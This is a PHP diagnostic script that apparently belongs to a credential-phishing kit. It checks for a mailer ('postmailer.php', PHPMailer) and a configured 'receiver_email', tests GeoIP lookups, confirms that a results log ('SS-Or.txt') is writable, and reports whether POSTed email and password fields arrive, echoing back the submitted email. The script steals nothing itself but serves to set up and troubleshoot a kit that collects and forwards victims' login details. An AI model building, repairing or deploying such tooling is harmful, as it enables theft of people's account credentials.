<?php
// Debug file to test all components
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$debug = array();

// Test 1: Basic PHP functionality
$debug['php_basic'] = array(
    'status' => 'pass',
    'message' => 'PHP is working',
    'version' => PHP_VERSION
);

// Test 2: Check if required files exist
$required_files = array(
    'class.phpmailer.php',
    'class.smtp.php', 
    'config.php',
    'postmailer.php'
);

foreach ($required_files as $file) {
    if (file_exists($file)) {
        $debug['files'][$file] = array(
            'status' => 'pass',
            'message' => 'File exists',
            'size' => filesize($file)
        );
    } else {
        $debug['files'][$file] = array(
            'status' => 'fail',
            'message' => 'File not found'
        );
    }
}

// Test 3: Try to include config file
try {
    require_once 'config.php';
    $debug['config'] = array(
        'status' => 'pass',
        'message' => 'Config loaded successfully',
        'receiver_email' => getConfig('receiver_email')
    );
} catch (Exception $e) {
    $debug['config'] = array(
        'status' => 'fail',
        'message' => 'Config error: ' . $e->getMessage()
    );
}

// Test 4: Try to include PHPMailer classes
try {
    require_once 'class.phpmailer.php';
    require_once 'class.smtp.php';
    
    $mail = new PHPMailer();
    $debug['phpmailer'] = array(
        'status' => 'pass',
        'message' => 'PHPMailer classes loaded successfully'
    );
} catch (Exception $e) {
    $debug['phpmailer'] = array(
        'status' => 'fail',
        'message' => 'PHPMailer error: ' . $e->getMessage()
    );
}

// Test 5: Test network connectivity
$test_url = 'http://www.geoplugin.net/json.gp?ip=8.8.8.8';
$context = stream_context_create(array(
    'http' => array(
        'timeout' => 5
    )
));

$result = @file_get_contents($test_url, false, $context);
if ($result !== false) {
    $debug['network'] = array(
        'status' => 'pass',
        'message' => 'Network connectivity test passed'
    );
} else {
    $debug['network'] = array(
        'status' => 'warning',
        'message' => 'Network connectivity test failed - GeoIP lookup may not work'
    );
}

// Test 6: Test file permissions
$log_file = 'SS-Or.txt';
$fp = @fopen($log_file, 'a');
if ($fp) {
    fclose($fp);
    $debug['permissions'] = array(
        'status' => 'pass',
        'message' => 'Log file is writable'
    );
} else {
    $debug['permissions'] = array(
        'status' => 'fail',
        'message' => 'Cannot write to log file'
    );
}

// Test 7: Check POST data
$debug['post_data'] = array(
    'received' => !empty($_POST),
    'email' => isset($_POST['email']) ? $_POST['email'] : 'not set',
    'password' => isset($_POST['password']) ? 'set' : 'not set'
);

// Overall status
$failed_tests = 0;
foreach ($debug as $test) {
    if (is_array($test) && isset($test['status']) && $test['status'] == 'fail') {
        $failed_tests++;
    }
}

$debug['overall'] = array(
    'status' => $failed_tests > 0 ? 'error' : 'success',
    'message' => $failed_tests > 0 ? $failed_tests . ' test(s) failed' : 'All tests passed',
    'timestamp' => date('Y-m-d H:i:s')
);

echo json_encode($debug, JSON_PRETTY_PRINT);
?>